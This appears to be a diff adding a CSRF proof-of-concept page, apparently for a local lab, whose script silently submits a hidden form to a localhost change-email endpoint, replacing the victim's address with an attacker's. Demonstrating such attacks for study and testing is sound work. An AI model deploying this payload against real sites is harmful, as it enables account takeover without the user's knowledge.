@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack Simulation</title>
+</head>
+<body>
+  <h1>CSRF Attack Simulation</h1>
+  <p>If you see this page, the iframe below will attempt to change your email address in the background.</p>
+
+  <iframe id="csrf-frame" style="display:none;"></iframe>
+
+  <script>
+    // Function to create and append a form to the iframe
+    function createAndSubmitForm() {
+      const iframe = document.getElementById('csrf-frame');
+      const doc = iframe.contentDocument || iframe.contentWindow.document;
+
+      // Create a form element
+      const form = doc.createElement('form');
+      form.method = 'POST';
+      form.action = 'http://localhost:3000/change-email';
+      form.style.display = 'none'; // Hide the form
+
+      // Create an input element for the email
+      const input = doc.createElement('input');
+      input.type = 'hidden';
+      input.name = 'email';
+      input.value = 'attacker@example.com';
+      form.appendChild(input);
+
+      // Append the form to the document body
+      doc.body.appendChild(form);
+
+      // Submit the form
+      form.submit();
+    }
+
+    // Execute the function after a 2-second delay
+    setTimeout(createAndSubmitForm, 2000);
+  </script>
+</body>
+</html>
